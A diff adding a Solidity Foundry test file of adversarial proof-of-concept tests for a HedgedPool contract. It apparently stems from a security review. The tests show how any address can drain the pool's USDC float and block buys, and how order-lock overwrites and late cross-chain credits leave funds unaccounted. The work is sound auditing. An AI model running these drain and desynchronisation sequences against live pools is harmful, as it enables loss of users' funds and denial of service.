@@ -1,0 +1,186 @@
+// SPDX-License-Identifier: Apache-2.0
+pragma solidity ^0.8.20;
+
+import {Test} from "forge-std/Test.sol";
+import {Core, IERC20} from "../../src/Core.sol";
+import {HedgedPool} from "../../src/HedgedPool.sol";
+
+contract R5USDC {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function mint(address to, uint256 amount) external { balanceOf[to] += amount; }
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+    function transfer(address to, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
+        allowance[from][msg.sender] -= amount;
+        balanceOf[from] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+}
+
+contract R5Writer {
+    bytes[] public sent;
+    function sendRawAction(bytes calldata action) external { sent.push(action); }
+    function count() external view returns (uint256) { return sent.length; }
+}
+
+/// @notice Adversarial lifecycle tests for the r4 timeout/lock design.
+contract R5LifecycleTest is Test {
+    uint64 internal constant HYPE = 1105;
+    uint64 internal constant SPOT = 1035;
+    uint64 internal constant OPS = 1e6;
+
+    HedgedPool internal pool;
+    R5USDC internal usdc;
+    R5Writer internal writer;
+    address internal keeper = address(0xBEEF);
+    address internal attacker = address(0xBAD);
+
+    function setUp() public {
+        vm.etch(address(Core.WRITER), address(new R5Writer()).code);
+        writer = R5Writer(address(Core.WRITER));
+        usdc = new R5USDC();
+        pool = new HedgedPool(IERC20(address(usdc)), keeper, HYPE, SPOT, 2);
+
+        vm.deal(keeper, 100 ether);
+        usdc.mint(keeper, 4_000e6);
+        vm.startPrank(keeper);
+        usdc.approve(address(pool), type(uint256).max);
+        pool.add{value: 100 ether}(4_000e6, 0);
+        vm.stopPrank();
+        _core(HYPE, OPS);
+        _core(Core.USDC, 0);
+    }
+
+    function _core(uint64 token, uint64 amount) internal {
+        vm.mockCall(
+            Core.SPOT_BALANCE, abi.encode(address(pool), token), abi.encode(Core.SpotBalance(amount, 0, 0))
+        );
+    }
+
+    function _px(uint64 amount) internal {
+        vm.mockCall(Core.SPOT_PX, abi.encode(SPOT), abi.encode(amount));
+    }
+
+    function _send(address to, uint64 token, uint64 amount) internal pure returns (bytes memory) {
+        return abi.encodePacked(
+            hex"0100000d", abi.encode(to, address(0), type(uint32).max, type(uint32).max, token, amount)
+        );
+    }
+
+    /// A later order replaces the only lock record.  If the older sell IOC executes after the
+    /// new buy overwrites it, sendBack promises the HYPE that the older IOC still spends.
+    function test_poc_crossRoundOrderOverwritesSpendLock() public {
+        _core(Core.USDC, 200e8);
+        _px(44_000_000);
+        vm.startPrank(keeper);
+        pool.start(true, 2 ether);
+        _core(HYPE, OPS + 2e8);
+        pool.order(); // round N sell; HYPE is the asset still at risk
+        skip(pool.ORDER_DELAY());
+        pool.sendBack(0); // HYPE correctly locked in this round
+        pool.finish();
+
+        _px(38_000_000);
+        pool.start(false, 100e6);
+        pool.order(); // round N+1 buy overwrites lastOrderSoldHype to false
+        skip(pool.ORDER_DELAY());
+        pool.sendBack(0);
+        vm.stopPrank();
+
+        assertEq(writer.sent(2), _send(Core.HYPE_SYSTEM, HYPE, 2e8), "old sell HYPE was promised");
+        assertEq(pool.expectH(), 100 ether);
+
+        // Feasible Core ordering: the delayed old IOC executes before this HYPE send.
+        // Its proceeds stay live on Core, but the promised HYPE cannot arrive.
+        _core(HYPE, OPS);
+        _core(Core.USDC, 28_230_123_456); // 200 USDC float + 82.30123456 sell proceeds
+        vm.expectRevert(HedgedPool.NotYet.selector);
+        pool.finish();
+        skip(pool.SETTLE_DELAY());
+        pool.finish();
+
+        assertEq(pool.rH(), 98 ether, "the HYPE promise was not fulfilled");
+        assertEq(uint8(pool.stage()), uint8(HedgedPool.Stage.Idle));
+    }
+
+    /// The retry baseline is fixed before a delayed sell fill.  A retry sends the newly received
+    /// USDC without increasing expectU, so finish can close after the first credit and before the
+    /// retry credit.  The latter becomes permanently unaccounted EVM USDC.
+    function test_poc_retryOfLateSellProceedsBecomesUnaccounted() public {
+        _core(Core.USDC, 10e8);
+        _px(42_000_000);
+        vm.startPrank(keeper);
+        pool.start(true, 2 ether);
+        _core(HYPE, OPS + 2e8);
+        pool.order();
+        skip(pool.ORDER_DELAY());
+        pool.sendBack(10e8); // initial 10 USDC float; floatAfter is zero
+        assertEq(pool.expectU(), 4_010e6);
+        assertEq(pool.floatAfter(), 0);
+
+        vm.roll(block.number + 1);
+        _core(HYPE, OPS);
+        _core(Core.USDC, 8_230_123_456); // old send debited, then delayed IOC fills
+        pool.sendBack(0); // sends the 82.301234 USDC growth, but expectU remains 4,010
+        vm.stopPrank();
+        assertEq(writer.sent(2), _send(address(0x2000000000000000000000000000000000000000), 0, 8_230_123_400));
+        assertEq(pool.expectU(), 4_010e6, "retry did not extend the expected credit");
+
+        _core(Core.USDC, 56); // both sends have debited Core (dust remains)
+        usdc.mint(address(pool), 10e6); // only the first Core->EVM credit has landed
+        pool.finish();
+        assertEq(pool.rU(), 4_010e6);
+
+        usdc.mint(address(pool), 82_301_234); // retry credit lands after Idle
+        assertEq(usdc.balanceOf(address(pool)), 4_092_301_234);
+        assertEq(pool.reserveU(), 4_010e6, "late EVM credit is excluded forever");
+    }
+
+    /// SETTLE_DELAY assumes a send is either rejected (funds remain Core) or already credited.
+    /// An accepted transfer whose EVM credit is merely late is in neither location when finish
+    /// snapshots rU, and its subsequent credit has no reconciliation path.
+    function test_poc_settleTimeoutDropsAcceptedButLateCreditFromAccounting() public {
+        _core(Core.USDC, 200e8);
+        vm.prank(attacker);
+        pool.sendBack(50e8);
+        assertEq(pool.expectU(), 4_050e6);
+
+        _core(Core.USDC, 150e8); // Core accepted/debited the send; EVM has not credited it
+        skip(pool.SETTLE_DELAY());
+        vm.prank(attacker);
+        pool.finish();
+        assertEq(pool.rU(), 4_000e6);
+        assertEq(pool.reserveU(), 4_150e6);
+
+        usdc.mint(address(pool), 50e6); // eventual Core->EVM credit
+        assertEq(usdc.balanceOf(address(pool)), 4_050e6);
+        assertEq(pool.reserveU(), 4_150e6, "the accepted transfer is permanently omitted");
+    }
+
+    /// Any address can make the pool return all USDC float, then finish it.  This leaves no Core
+    /// float for an otherwise-valid buy rebalance; EVM USDC cannot be put back on Core by this design.
+    function test_poc_anyoneCanDrainFloatAndBlockBuys() public {
+        _core(Core.USDC, 200e8);
+        _px(38_000_000);
+        vm.prank(attacker);
+        pool.sendBack(200e8);
+        _core(Core.USDC, 0);
+        usdc.mint(address(pool), 200e6);
+        vm.prank(attacker);
+        pool.finish();
+
+        vm.prank(keeper);
+        vm.expectRevert(abi.encodeWithSelector(HedgedPool.TooMuch.selector, 0));
+        pool.start(false, 100e6);
+    }
+}
